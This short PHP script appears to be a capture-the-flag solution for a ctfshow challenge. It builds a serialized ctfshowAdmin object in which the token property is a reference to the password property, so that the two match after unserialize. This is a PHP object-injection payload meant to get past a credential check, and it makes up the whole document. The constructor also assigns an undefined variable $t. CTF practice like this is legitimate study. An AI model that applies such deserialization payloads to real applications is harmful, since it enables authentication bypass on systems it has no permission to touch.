<?php
class ctfshowAdmin{
    public $token;
    public $password;
    public function __construct(){
        $this->token=$t;
        $this->token=&$this->password;
    }
}
$a=new ctfshowAdmin;
echo serialize($a);
?>